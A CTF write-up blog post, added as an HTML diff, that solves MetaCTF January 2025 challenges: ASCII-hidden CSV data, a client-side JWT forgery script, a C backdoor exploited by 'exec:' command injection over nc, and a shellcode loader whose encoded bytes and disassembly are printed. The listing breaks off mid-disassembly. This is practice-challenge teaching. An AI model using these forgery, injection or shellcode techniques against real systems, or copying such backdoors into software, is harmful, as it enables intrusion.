@@ -1,0 +1,612 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️🏴 MetaCTF January 2025 Flash CTF</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://bsky.app/profile/psypherpunk.io"><i class="fa-brands fa-bluesky"></i> Bluesky</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+        <main class="container">
+            
+    <h1 class="title">
+        ️🏴 MetaCTF January 2025 Flash CTF
+    </h1>
+    <blockquote>A monthly mini CTF competition organized by MetaCTF and Antisyphon.</blockquote>
+    <p class="subtitle text-end"><strong>2025-01-26</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/ctf/" >
+                        #ctf
+                    </a>
+                
+            </small>
+        </p>
+    
+    <blockquote>
+<p><em>A monthly mini CTF competition organized by MetaCTF with support from
+Antisyphon Training, TCM Security, Simply Cyber Academy. There will be 5
+challenges and you will have 2 hours to solve as many as you can. This is a
+beginner-friendly CTF.</em></p>
+</blockquote>
+<p>Details here: <a href="https://app.metactf.com/join/jan2025">https://app.metactf.com/join/jan2025</a>.</p>
+<h2 id="cooked-books">Cooked Books</h2>
+<blockquote>
+<p><em>We signed up for a new digital library provider, but the numbers they're
+giving us for the amount of times that our banned book selection is getting
+borrowed doesn't seem right, we believe they're hiding some sort of message
+in the report.</em></p>
+<p><em>Download the report
+<a href="https://metaproblems.com/b6672e84d7521b831764815b79d363c3/banned_books_report.csv">here</a>.</em></p>
+</blockquote>
+<p>The data look something like this:</p>
+<table><thead><tr><th>Title</th><th>Author</th><th>Times Borrowed</th><th>Avg Rating</th></tr></thead><tbody>
+<tr><td>To Kill a Mockingbird</td><td>Harper Lee</td><td>77</td><td>4.26</td></tr>
+<tr><td>1984</td><td>George Orwell</td><td>101</td><td>4.2</td></tr>
+<tr><td>The Catcher in the Rye</td><td>J.D. Salinger</td><td>116</td><td>3.8</td></tr>
+<tr><td>The Handmaid's Tale</td><td>Margaret Atwood</td><td>97</td><td>4.14</td></tr>
+<tr><td>Fahrenheit 451</td><td>Ray Bradbury</td><td>67</td><td>3.96</td></tr>
+<tr><td>The Bluest Eye</td><td>Toni Morrison</td><td>84</td><td>4.12</td></tr>
+<tr><td>Of Mice and Men</td><td>John Steinbeck</td><td>70</td><td>3.89</td></tr>
+<tr><td>Animal Farm</td><td>George Orwell</td><td>123</td><td>4.0</td></tr>
+<tr><td>Lord of the Flies</td><td>William Golding</td><td>49</td><td>3.7</td></tr>
+</tbody></table>
+<p>As implied by the description, the <em>Times Borrowed</em> is suspiciously in the
+ASCII range for all rows:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>&gt;&gt;&gt; </span><span style="color:#b48ead;">import </span><span>csv
+</span><span>&gt;&gt;&gt; </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">banned_books_report.csv</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>i:
+</span><span style="color:#d08770;">...     </span><span style="color:#96b5b4;">print</span><span>(
+</span><span style="color:#d08770;">...         </span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>(</span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#bf616a;">int</span><span>(book[&quot;</span><span style="color:#a3be8c;">Times Borrowed</span><span>&quot;])) </span><span style="color:#b48ead;">for </span><span>book </span><span style="color:#b48ead;">in </span><span>csv.</span><span style="color:#bf616a;">DictReader</span><span>(i))
+</span><span style="color:#d08770;">...     </span><span>)
+</span><span style="color:#d08770;">...
+</span><span>MetaCTF{1nf0rm4ti0n_1s_p0w3r}
+</span></code></pre>
+<h2 id="trading-places">Trading Places</h2>
+<blockquote>
+<p><em>My friends Hannah and Steven from college are starting up a new fintech
+company. They sent me the link to their trading platform so I can take a look
+(in demo mode). It's supposedly quite secure, using the latest in
+cryptographic standards.</em></p>
+<p><em>Why don't you take <a href="https://host5.metaproblems.com:7606/">a look</a>?</em></p>
+</blockquote>
+<p>The site provides <code>guest</code>:<code>guest</code> credentials to authenticate, after which it
+kindly informs users that:</p>
+<blockquote>
+<p><em>Guest preview mode enabled - <code>admin</code> login required to make trades.</em></p>
+</blockquote>
+<p>Once authenticated, we're provided a JWT. However, the actual process that sets
+said JWT is a little odd:</p>
+<pre data-lang="js" style="background-color:#2b303b;color:#c0c5ce;" class="language-js "><code class="language-js" data-lang="js"><span>&lt;</span><span style="color:#bf616a;">script type</span><span>=&quot;</span><span style="color:#a3be8c;">module</span><span>&quot;&gt;
+</span><span>    </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">* </span><span style="color:#b48ead;">as </span><span style="color:#bf616a;">jose </span><span style="color:#b48ead;">from </span><span>&#39;</span><span style="color:#a3be8c;">https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js</span><span>&#39;;
+</span><span>    </span><span style="color:#b48ead;">const </span><span>{ </span><span style="color:#bf616a;">SignJWT </span><span>} = </span><span style="color:#bf616a;">jose</span><span>;
+</span><span>
+</span><span>    window.</span><span style="color:#8fa1b3;">onload </span><span>= </span><span style="color:#b48ead;">function </span><span>() {
+</span><span>        document.</span><span style="color:#96b5b4;">getElementById</span><span>(&#39;</span><span style="color:#a3be8c;">login-form</span><span>&#39;).</span><span style="color:#8fa1b3;">onsubmit </span><span>= </span><span style="color:#b48ead;">async </span><span>(</span><span style="color:#bf616a;">e</span><span>) </span><span style="color:#b48ead;">=&gt; </span><span>{
+</span><span>            </span><span style="color:#bf616a;">e</span><span>.</span><span style="color:#96b5b4;">preventDefault</span><span>();
+</span><span>            </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">formData </span><span>= new FormData(</span><span style="color:#bf616a;">e</span><span>.target);
+</span><span>            </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">user </span><span>= </span><span style="color:#bf616a;">formData</span><span>.</span><span style="color:#96b5b4;">get</span><span>(&#39;</span><span style="color:#a3be8c;">username</span><span>&#39;);
+</span><span>            </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">pass </span><span>= </span><span style="color:#bf616a;">formData</span><span>.</span><span style="color:#96b5b4;">get</span><span>(&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;);
+</span><span>            </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">response </span><span>= </span><span style="color:#b48ead;">await </span><span style="color:#8fa1b3;">fetch</span><span>(&#39;</span><span style="color:#a3be8c;">/login</span><span>&#39;, {
+</span><span>                method: &#39;</span><span style="color:#a3be8c;">POST</span><span>&#39;,
+</span><span>                body: new URLSearchParams({
+</span><span>                    username: </span><span style="color:#bf616a;">user</span><span>,
+</span><span>                    password: </span><span style="color:#bf616a;">pass
+</span><span>                }),
+</span><span>                headers: { &#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/x-www-form-urlencoded</span><span>&#39; }
+</span><span>            });
+</span><span>            </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">resp </span><span>= </span><span style="color:#b48ead;">await </span><span style="color:#bf616a;">response</span><span>.</span><span style="color:#8fa1b3;">json</span><span>();
+</span><span>            </span><span style="color:#b48ead;">if </span><span>(&quot;</span><span style="color:#a3be8c;">success</span><span>&quot; in </span><span style="color:#bf616a;">resp</span><span>) {
+</span><span>                </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">token </span><span>= new TextEncoder().</span><span style="color:#8fa1b3;">encode</span><span>(</span><span style="color:#bf616a;">response</span><span>.headers.</span><span style="color:#96b5b4;">get</span><span>(&quot;</span><span style="color:#a3be8c;">jwt</span><span>&quot;));
+</span><span>                </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">jwt </span><span>= </span><span style="color:#b48ead;">await </span><span>new SignJWT({ sub: </span><span style="color:#bf616a;">user </span><span>})
+</span><span>                    .</span><span style="color:#8fa1b3;">setProtectedHeader</span><span>({ alg: &quot;</span><span style="color:#a3be8c;">HS256</span><span>&quot; })
+</span><span>                    .</span><span style="color:#8fa1b3;">setIssuedAt</span><span>()
+</span><span>                    .</span><span style="color:#8fa1b3;">setExpirationTime</span><span>(&quot;</span><span style="color:#a3be8c;">2h</span><span>&quot;)
+</span><span>                    .</span><span style="color:#8fa1b3;">sign</span><span>(</span><span style="color:#bf616a;">token</span><span>);
+</span><span>                document.cookie = &quot;</span><span style="color:#a3be8c;">jwt=</span><span>&quot; + </span><span style="color:#bf616a;">jwt</span><span>;
+</span><span>                window.location.href = &quot;</span><span style="color:#a3be8c;">/dashboard</span><span>&quot;;
+</span><span>            } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>                </span><span style="color:#8fa1b3;">alert</span><span>(&quot;</span><span style="color:#a3be8c;">Incorrect username or password.</span><span>&quot;);
+</span><span>            }
+</span><span>        };
+</span><span>    }
+</span><span>&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span></code></pre>
+<p>Having authenticated as <code>guest</code>, the resulting token is signed <em>but</em> the <code>sub</code>
+is derived and the token signed client-side: can <code>sub</code> be set to <code>admin</code>?</p>
+<p>Adapting the above and using the browser console:</p>
+<pre data-lang="js" style="background-color:#2b303b;color:#c0c5ce;" class="language-js "><code class="language-js" data-lang="js"><span>import(&#39;</span><span style="color:#a3be8c;">https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js</span><span>&#39;).</span><span style="color:#96b5b4;">then</span><span>(</span><span style="color:#bf616a;">m </span><span style="color:#b48ead;">=&gt; </span><span style="color:#bf616a;">jose </span><span>= </span><span style="color:#bf616a;">m</span><span>);
+</span><span style="color:#b48ead;">const </span><span>{ </span><span style="color:#bf616a;">SignJWT </span><span>} = </span><span style="color:#bf616a;">jose</span><span>;
+</span><span>
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">user </span><span>= &#39;</span><span style="color:#a3be8c;">guest</span><span>&#39;;
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">pass </span><span>= &#39;</span><span style="color:#a3be8c;">guest</span><span>&#39;
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">response </span><span>= </span><span style="color:#b48ead;">await </span><span style="color:#8fa1b3;">fetch</span><span>(&#39;</span><span style="color:#a3be8c;">/login</span><span>&#39;, {
+</span><span>    method: &#39;</span><span style="color:#a3be8c;">POST</span><span>&#39;,
+</span><span>    body: new URLSearchParams({
+</span><span>        username: </span><span style="color:#bf616a;">user</span><span>,
+</span><span>        password: </span><span style="color:#bf616a;">pass
+</span><span>    }),
+</span><span>    headers: { &#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/x-www-form-urlencoded</span><span>&#39; }
+</span><span>});
+</span><span>
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">resp </span><span>= </span><span style="color:#b48ead;">await </span><span style="color:#bf616a;">response</span><span>.</span><span style="color:#8fa1b3;">json</span><span>();
+</span><span style="color:#b48ead;">if </span><span>(&quot;</span><span style="color:#a3be8c;">success</span><span>&quot; in </span><span style="color:#bf616a;">resp</span><span>) {
+</span><span>    </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">token </span><span>= new TextEncoder().</span><span style="color:#8fa1b3;">encode</span><span>(</span><span style="color:#bf616a;">response</span><span>.headers.</span><span style="color:#96b5b4;">get</span><span>(&quot;</span><span style="color:#a3be8c;">jwt</span><span>&quot;));
+</span><span>    </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">jwt </span><span>= </span><span style="color:#b48ead;">await </span><span>new SignJWT({ sub: &#39;</span><span style="color:#a3be8c;">admin</span><span>&#39; })
+</span><span>        .</span><span style="color:#8fa1b3;">setProtectedHeader</span><span>({ alg: &quot;</span><span style="color:#a3be8c;">HS256</span><span>&quot; })
+</span><span>        .</span><span style="color:#8fa1b3;">setIssuedAt</span><span>()
+</span><span>        .</span><span style="color:#8fa1b3;">setExpirationTime</span><span>(&quot;</span><span style="color:#a3be8c;">2h</span><span>&quot;)
+</span><span>        .</span><span style="color:#8fa1b3;">sign</span><span>(</span><span style="color:#bf616a;">token</span><span>);
+</span><span>    document.cookie = &quot;</span><span style="color:#a3be8c;">jwt=</span><span>&quot; + </span><span style="color:#bf616a;">jwt</span><span>;
+</span><span>    window.location.href = &quot;</span><span style="color:#a3be8c;">/dashboard</span><span>&quot;;
+</span><span>} </span><span style="color:#b48ead;">else </span><span>{
+</span><span>    </span><span style="color:#8fa1b3;">alert</span><span>(&quot;</span><span style="color:#a3be8c;">Incorrect username or password.</span><span>&quot;);
+</span><span>}
+</span></code></pre>
+<p>The dashboard then contains:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">h2</span><span>&gt;The flag is &lt;</span><span style="color:#bf616a;">code</span><span>&gt;MetaCTF{cli3nt_s1d3_crypt0graph1c5}&lt;/</span><span style="color:#bf616a;">code</span><span>&gt;&lt;/</span><span style="color:#bf616a;">h2</span><span>&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">center</span><span>&gt;&lt;</span><span style="color:#bf616a;">p</span><span>&gt;Congrats!&lt;/</span><span style="color:#bf616a;">p</span><span>&gt;&lt;/</span><span style="color:#bf616a;">center</span><span>&gt;
+</span></code></pre>
+<h2 id="rear-hatch">Rear Hatch</h2>
+<blockquote>
+<p><em>We've been getting a lot of suspicious reports in our Maintenance Schedule
+Management application, we're worried that the contractor who we had write
+the application may have included some sort of backdoor, can you check it
+out?</em></p>
+<p><em>Download the source code
+<a href="https://metaproblems.com/10d1e378bb37262a842c256f481d3fb5/RearHatch.c">here</a>,
+then when you're ready, connect to the real service with
+<code>nc kubenode.mctf.io 30014</code></em></p>
+</blockquote>
+<p>The source code does indeed contain this odd function:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">markRequestCompleted</span><span>() {
+</span><span>    </span><span style="color:#b48ead;">int</span><span> id;
+</span><span>    </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Enter the ID of the request to mark as completed: </span><span>&quot;);
+</span><span>    </span><span style="color:#96b5b4;">scanf</span><span>(&quot;</span><span style="color:#d08770;">%d</span><span>&quot;, &amp;id);
+</span><span>    </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; requestCount; i++) {
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(requests[i].</span><span style="color:#bf616a;">id </span><span>== id &amp;&amp; (</span><span style="color:#96b5b4;">strncmp</span><span>((</span><span style="color:#b48ead;">char </span><span>*)requests+i*</span><span style="color:#d08770;">264</span><span>+</span><span style="color:#d08770;">4</span><span>,&quot;</span><span style="color:#96b5b4;">\x65\x78\x65\x63\x3a</span><span>&quot;,</span><span style="color:#d08770;">5</span><span>)==</span><span style="color:#d08770;">0</span><span>?</span><span style="color:#96b5b4;">system</span><span>((</span><span style="color:#b48ead;">char </span><span>*)requests+i*</span><span style="color:#d08770;">264</span><span>+</span><span style="color:#d08770;">9</span><span>),</span><span style="color:#d08770;">1</span><span>:</span><span style="color:#d08770;">1</span><span>)) {
+</span><span>            requests[i].</span><span style="color:#bf616a;">isCompleted </span><span>= </span><span style="color:#d08770;">1</span><span>;
+</span><span>            </span><span style="color:#bf616a;">saveRequests</span><span>();
+</span><span>            </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Request marked as completed.</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>            </span><span style="color:#b48ead;">return</span><span>;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Request with ID </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> not found.</span><span style="color:#96b5b4;">\n</span><span>&quot;, id);
+</span><span>    </span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p><em>Odd</em> insofar as those bytes have an interesting meaning:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>&gt;&gt;&gt; </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\x65\x78\x65\x63\x3a</span><span>&quot;)
+</span><span style="color:#b48ead;">exec</span><span>:
+</span></code></pre>
+<p>So if a request <em>starts</em> with <code>exec:</code>, <code>system()</code> will be called against the
+subsequent bytes.</p>
+<p>However, it's not clear where the flag is but that can be determined readily
+enough:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> nc kubenode.mctf.io 30014
+</span><span style="color:#bf616a;">No</span><span> existing data file found. Starting fresh.
+</span><span>
+</span><span>=</span><span style="color:#a3be8c;">== </span><span style="color:#bf616a;">Maintenance</span><span> Schedule Management ===
+</span><span style="color:#bf616a;">1.</span><span> Add Maintenance Request
+</span><span style="color:#bf616a;">2.</span><span> View Maintenance Requests
+</span><span style="color:#bf616a;">3.</span><span> Delete Maintenance Request
+</span><span style="color:#bf616a;">4.</span><span> Mark Request as Completed
+</span><span style="color:#bf616a;">5.</span><span> Exit
+</span><span>=</span><span style="color:#a3be8c;">======================================
+</span><span style="color:#bf616a;">Enter</span><span> your choice: 1
+</span><span style="color:#bf616a;">Enter</span><span> description for the maintenance request: exec:ls
+</span><span style="color:#bf616a;">Request</span><span> added successfully.
+</span><span>
+</span><span>=</span><span style="color:#a3be8c;">== </span><span style="color:#bf616a;">Maintenance</span><span> Schedule Management ===
+</span><span style="color:#bf616a;">1.</span><span> Add Maintenance Request
+</span><span style="color:#bf616a;">2.</span><span> View Maintenance Requests
+</span><span style="color:#bf616a;">3.</span><span> Delete Maintenance Request
+</span><span style="color:#bf616a;">4.</span><span> Mark Request as Completed
+</span><span style="color:#bf616a;">5.</span><span> Exit
+</span><span>=</span><span style="color:#a3be8c;">======================================
+</span><span style="color:#bf616a;">Enter</span><span> your choice: 4
+</span><span style="color:#bf616a;">Enter</span><span> the ID of the request to mark as completed: 1
+</span><span style="color:#bf616a;">flag.txt
+</span><span style="color:#bf616a;">run
+</span><span style="color:#bf616a;">Request</span><span> marked as completed.
+</span></code></pre>
+<p>Oh. I should have guessed.</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span>=</span><span style="color:#a3be8c;">== </span><span style="color:#bf616a;">Maintenance</span><span> Schedule Management ===
+</span><span style="color:#bf616a;">1.</span><span> Add Maintenance Request
+</span><span style="color:#bf616a;">2.</span><span> View Maintenance Requests
+</span><span style="color:#bf616a;">3.</span><span> Delete Maintenance Request
+</span><span style="color:#bf616a;">4.</span><span> Mark Request as Completed
+</span><span style="color:#bf616a;">5.</span><span> Exit
+</span><span>=</span><span style="color:#a3be8c;">======================================
+</span><span style="color:#bf616a;">Enter</span><span> your choice: 1
+</span><span style="color:#bf616a;">Enter</span><span> description for the maintenance request: exec:cat flag.txt
+</span><span style="color:#bf616a;">Request</span><span> added successfully.
+</span><span>
+</span><span>=</span><span style="color:#a3be8c;">== </span><span style="color:#bf616a;">Maintenance</span><span> Schedule Management ===
+</span><span style="color:#bf616a;">1.</span><span> Add Maintenance Request
+</span><span style="color:#bf616a;">2.</span><span> View Maintenance Requests
+</span><span style="color:#bf616a;">3.</span><span> Delete Maintenance Request
+</span><span style="color:#bf616a;">4.</span><span> Mark Request as Completed
+</span><span style="color:#bf616a;">5.</span><span> Exit
+</span><span>=</span><span style="color:#a3be8c;">======================================
+</span><span style="color:#bf616a;">Enter</span><span> your choice: 4
+</span><span style="color:#bf616a;">Enter</span><span> the ID of the request to mark as completed: 2
+</span><span style="color:#bf616a;">MetaCTF{4lw4ys_r34d_4ll_7h3_c0d3</span><span>}</span><span style="color:#bf616a;">Request</span><span> marked as completed.
+</span></code></pre>
+<h2 id="i-heard-you-liked-loaders">I Heard You Liked Loaders</h2>
+<blockquote>
+<p><em>I hope you like mine :)</em></p>
+<p><em>Download the loader
+<a href="https://metaproblems.com/d8fdeee664c1699c80687aca2873f974/loader">here</a>.</em></p>
+</blockquote>
+<p>Yeah. "Loaders". I definitely know what's meant in this context.</p>
+<p>Anyway…</p>
+<p>Courtesy of <a href="https://binary.ninja/free/">BinaryNinja</a>:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>int64_t </span><span style="color:#8fa1b3;">main</span><span>()
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">void</span><span>* fsbase;
+</span><span>    int64_t rax = *(uint64_t*)((</span><span style="color:#b48ead;">char</span><span>*)fsbase + </span><span style="color:#d08770;">0x28</span><span>);
+</span><span>    int64_t rax_1 = </span><span style="color:#bf616a;">mmap</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">0x400</span><span>, </span><span style="color:#d08770;">7</span><span>, </span><span style="color:#d08770;">0x22</span><span>, </span><span style="color:#d08770;">0xffffffff</span><span>, </span><span style="color:#d08770;">0</span><span>);
+</span><span>    </span><span style="color:#bf616a;">__builtin_memcpy</span><span>(rax_1, &quot;</span><span style="color:#96b5b4;">\xbf\x01\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\xb8\x65\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x02\xeb\x0a\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05\xe8\x00\x00\x00\x00\x48\x8d\x35\x1e\x00\x00\x00\x48\xff\xce\x8a\x06\x84\xc0\x74\x14\x8a\x5e\x01\x30\xd8\x32\x46\xff\x2c\x07\x88\x06\x48\xff\xc6\xeb\xe9\xff\xe6\x90\xff\x20\x50\xa6\x29\x59\xb8\x3e\x4e\xa6\x3b\x4b\x87\x3e\x4e\x79\xd2\xa7\x51\xc5\xb0\x51\xcc\xb9\x51\xd7\xa2\x71\x79\xfa\x26\xa7\x85\xa2\xa5\xa2\x1a\x3c\xe3\x3f\xae\xbc\xbb\xbc\xbb\xf4\xba\x82\x0d\x43\x71\x8e\xb3\x34\xb3\xf4\x34\xb0\x49\x41\x47\x40\x3a\x40\x44\x52\x27\x20\x27\x85\x53\x8a\xba\xb7\x43\x66\x80\x8e\xd8\x22\x3f\x89\x87\xdf\x3b\x0e\xd0\x80\xd7\x45\x2c\xad\xb2\xc7\x01\x73\x8e\xd4\xf0\x27\x05\xdb\x8b\x8f\x3f\x03\x82\x9d\xca\xf9\x4c\xc4\x44\xac\x6b\x50\x57\x6f\xa9\x48\x00\xcc\x00</span><span>&quot;, </span><span style="color:#d08770;">0xcb</span><span>);
+</span><span>    </span><span style="color:#bf616a;">rax_1</span><span>();
+</span><span>    
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(rax == *(uint64_t*)((</span><span style="color:#b48ead;">char</span><span>*)fsbase + </span><span style="color:#d08770;">0x28</span><span>))
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span>;
+</span><span>    
+</span><span>    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">__stack_chk_fail</span><span>();
+</span><span>}
+</span></code></pre>
+<p>…and courtesy of CyberChef (stripping all the <code>\x</code> and using its "Disassemble
+x86" operation), the above encoded shellcode appears to be:</p>
+<pre data-lang="as" style="background-color:#2b303b;color:#c0c5ce;" class="language-as "><code class="language-as" data-lang="as"><span style="color:#d08770;">0000000000000000</span><span> BF01000000                      MOV EDI,</span><span style="color:#d08770;">00000001
+</span><span style="color:#d08770;">0000000000000005</span><span> 4831F6                          XOR RSI,RSI
+</span><span style="color:#d08770;">0000000000000008</span><span> 4831D2                          XOR RDX,RDX
+</span><span>000000000000000B 4D31D2                          XOR R10,R10
+</span><span>000000000000000E B865000000                      MOV EAX,</span><span style="color:#d08770;">00000065
+</span><span style="color:#d08770;">0000000000000013</span><span> 0F05                            SYSCALL
+</span><span style="color:#d08770;">0000000000000015</span><span> 4883F800                        CMP RAX,</span><span style="color:#d08770;">0000000000000000
+</span><span style="color:#d08770;">0000000000000019 7502</span><span>                            JNE 000000000000001D
+</span><span>000000000000001B EB0A                            JMP </span><span style="color:#d08770;">0000000000000027
+</span><span>000000000000001D 4831FF                          XOR RDI,RDI
+</span><span style="color:#d08770;">0000000000000020</span><span> B83C000000                      MOV EAX,0000003C
+</span><span style="color:#d08770;">0000000000000025</span><span> 0F05                            SYSCALL
+</span><span style="color:#d08770;">0000000000000027</span><span> E800000000                      CALL </span><span style="color:#d08770;">0000000</span><span>-FFFFFFD4
+</span><span>000000000000002C 488D351E000000                  LEA RSI,[</span><span style="color:#d08770;">0000000</span><span>-FFFFFFAF]
+</span><span style="color:#d08770;">0000000000000033</span><span> 48FFCE                          DEC RSI
+</span><span style="color:#d08770;">0000000000000036</span><span> 8A06                            MOV AL,BYTE PTR [RSI]
+</span><span style="color:#d08770;">0000000000000038</span><span> 84C0                            TEST AL,AL
+</span><span>000000000000003A </span><span style="color:#d08770;">7414</span><span>                            JE </span><span style="color:#d08770;">0000000000000050
+</span><span>000000000000003C 8A5E01                          MOV BL,BYTE PTR [RSI+</span><span style="color:#d08770;">01</span><span>]
+</span><span style="color:#d08770;">000000000000003F</span><span> 30D8                            XOR AL,BL
+</span><span style="color:#d08770;">0000000000000041</span><span> 3246FF                          XOR AL,BYTE PTR [RSI-</span><span style="color:#d08770;">01</span><span>]
+</span><span style="color:#d08770;">0000000000000044</span><span> 2C07                            SUB AL,</span><span style="color:#d08770;">07
+</span><span style="color:#d08770;">0000000000000046 8806</span><span>                            MOV BYTE PTR [RSI],AL
+</span><span style="color:#d08770;">0000000000000048</span><span> 48FFC6                          INC RSI
+</span><span>000000000000004B EBE9                            JMP </span><span style="color:#d08770;">0000000000000036
+</span><span>000000000000004D FFE6                            JMP RSI
+</span><span style="color:#d08770;">000000000000004F 90</span><span>                              NOP
+</span><span style="color:#d08770;">0000000000000050</span><span> FF20                            JMP QWORD PTR [RAX]
+</span><span style="color:#d08770;">0000000000000052 50</span><span>                              PUSH RAX
+</span><span style="color:#d08770;">0000000000000053</span><span> A6                              CMPS BYTE PTR [RDI],BYTE PTR [RSI]
+</span><span style="color:#d08770;">0000000000000054</span><span> 2959B8                          SUB DWORD PTR [RCX-</span><span style="color:#d08770;">48</span><span>],EBX
+</span><span style="color:#d08770;">0000000000000057</span><span> 3E4EA6                          CMPS BYTE PTR DS:[RDI],BYTE PTR DS:[RSI]
+</span><span>000000000000005A 3B4B87                          CMP ECX,DWORD PTR [RBX-</span><span style="color:#d08770;">79</span><span>]
+</span><span>000000000000005D 3E4E79D2                        HT  JNS </span><span style="color:#d08770;">0000000000000033
+</span><span style="color:#d08770;">0000000000000061</span><span> A7                              CMPS DWORD PTR [RDI],DWORD PTR [RSI]
+</span><span style="color:#d08770;">0000000000000062 51</span><span>                              PUSH RCX
+</span><span style="color:#d08770;">0000000000000063</span><span> C5B051CC                        VSQRTPS XMM1,XMM4
+</span><span style="color:#d08770;">0000000000000067</span><span> B951D7A271                      MOV ECX,71A2D751
+</span><span>000000000000006C 79FA                            JNS </span><span style="color:#d08770;">0000000000000068
+</span><span>000000000000006E 26A7                            CMPS DWORD PTR ES:[RDI],DWORD PTR ES:[RSI]
+</span><span style="color:#d08770;">0000000000000070</span><span> 85A2A5A21A3C                    TEST DWORD PTR [RDX+3C1AA2A5],ESP
+</span><span style="color:#d08770;">0000000000000076</span><span> E33F                            JRCXZ 00000000000000B7
+</span><span style="color:#d08770;">0000000000000078</span><span> AE                              SCAS AL,BYTE PTR [RDI]
+</span><span style="color:#d08770;">0000000000000079</span><span> BCBBBCBBF4                      MOV ESP,F4BBBCBB
+</span><span>000000000000007E BA820D4371                      MOV EDX,71430D82
